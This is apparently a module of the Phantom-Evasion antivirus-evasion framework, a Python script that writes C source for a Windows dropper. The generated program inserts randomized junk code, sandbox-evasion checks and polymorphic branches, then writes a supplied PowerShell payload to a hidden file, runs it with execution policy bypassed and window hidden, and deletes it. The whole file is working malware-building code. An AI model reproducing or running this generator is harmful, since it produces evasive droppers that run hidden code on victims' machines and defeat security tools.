
     ########################################################################################
     #                                                                                      #
     #    This file is part of Phantom-Evasion.                                             #
     #                                                                                      #
     #    Phantom-Evasion is free software: you can redistribute it and/or modify           #
     #    it under the terms of the GNU General Public License as published by              #
     #    the Free Software Foundation, either version 3 of the License, or                 #
     #    (at your option) any later version.                                               #
     #                                                                                      #
     #    Phantom-Evasion is distributed in the hope that it will be useful,                #
     #    but WITHOUT ANY WARRANTY; without even the implied warranty of                    #
     #    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the                     #
     #    GNU General Public License for more details.                                      #
     #                                                                                      #  
     #    You should have received a copy of the GNU General Public License                 #
     #   along with Phantom-Evasion.  If not, see <http://www.gnu.org/licenses/>.           #
     #                                                                                      #
     ########################################################################################

import random, string
import sys 
from random import shuffle
sys.path.append("Modules/payloads/auxiliar")
import usefull


Powershell_Script = usefull.powershell_adjust(sys.argv[1]) + ";\n"

Filename = sys.argv[2]



Randpshvarname = usefull.varname_creator()

Randcmdvarname = usefull.varname_creator()

Randscriptname = usefull.varname_creator() + ".ps1"

Randfileptr = usefull.varname_creator()

Randattr = usefull.varname_creator()

Junkcode1 = usefull.Junkmathinject(str(random.randint(1,16)))	        # Junkcode
Junkcode2 = usefull.Junkmathinject(str(random.randint(1,16)))		# Junkcode
Junkcode3 = usefull.Junkmathinject(str(random.randint(1,16)))		# Junkcode
Junkcode4 = usefull.Junkmathinject(str(random.randint(1,16)))		# Junkcode
Junkcode5 = usefull.Junkmathinject(str(random.randint(1,16)))		# Junkcode
Junkcode6 = usefull.Junkmathinject(str(random.randint(1,16)))		# Junkcode
Junkcode7 = usefull.Junkmathinject(str(random.randint(1,16)))		# Junkcode
Junkcode8 = usefull.Junkmathinject(str(random.randint(1,16)))		# Junkcode
Junkcode9 = usefull.Junkmathinject(str(random.randint(1,16)))		# Junkcode

Win_eva1 = usefull.windows_evasion(str(random.randint(1,5)))
Win_eva2 = usefull.windows_evasion(str(random.randint(1,5)))
Win_eva3 = usefull.windows_evasion(str(random.randint(1,5)))
Win_eva4 = usefull.windows_evasion(str(random.randint(1,5)))


MorphEvasion1 = str(usefull.Polymorph_Multipath_Evasion(str(random.randint(1,7)),Filename))
MorphEvasion2 = str(usefull.Polymorph_Multipath_Evasion(str(random.randint(1,7)),Filename))
MorphEvasion3 = str(usefull.Polymorph_Multipath_Evasion(str(random.randint(1,7)),Filename))
 
Hollow_code = ""
Hollow_code += "#include <windows.h>\n"
Hollow_code += "#include <stdio.h>\n"
Hollow_code += "#include <string.h>\n"
Hollow_code += "#include <math.h>\n"
Hollow_code += "int main(int argc,char * argv[]){\n"
Hollow_code += Junkcode1
Hollow_code += Win_eva1
Hollow_code += Win_eva2
Hollow_code += Win_eva3
Hollow_code += Win_eva4
Hollow_code += Junkcode2
Hollow_code += MorphEvasion1
Hollow_code += MorphEvasion2
Hollow_code += MorphEvasion3
Hollow_code += Junkcode3
Hollow_code += "char " + Randpshvarname + "[] = " + Powershell_Script 
Hollow_code += "char " + Randcmdvarname + "[] = \"powershell -executionpolicy bypass -WindowStyle Hidden -Noexit -File " + Randscriptname +  "\";\n"
Hollow_code += "FILE *" + Randfileptr + " = fopen(\"" + Randscriptname + "\",\"w\");\n"
Hollow_code += "fputs(" + Randpshvarname + "," + Randfileptr + ");\n"
Hollow_code += "fclose(" + Randfileptr + ");\n"
Hollow_code += "DWORD " + Randattr + " = GetFileAttributes(\"" + Randscriptname + "\");\n"
Hollow_code += "SetFileAttributes(\"" + Randscriptname + "\"," + Randattr + " + FILE_ATTRIBUTE_HIDDEN);\n"
Hollow_code += Junkcode4
Hollow_code += Junkcode5
Hollow_code += "system(" + Randcmdvarname + ");\n"
Hollow_code += "remove(\"" + Randscriptname + "\");\n"
Hollow_code += "}else{" + Junkcode6 + "}\n"
Hollow_code += "}else{" + Junkcode7 + "}\n"
Hollow_code += "}else{" + Junkcode8 + "}\n"
Hollow_code += "}}"  + Junkcode9 + "}}\n" 
Hollow_code += "return 0;}"
Hollow_code = Hollow_code.encode('utf-8')

with open('Source.c','wb') as f:
    f.write(Hollow_code)


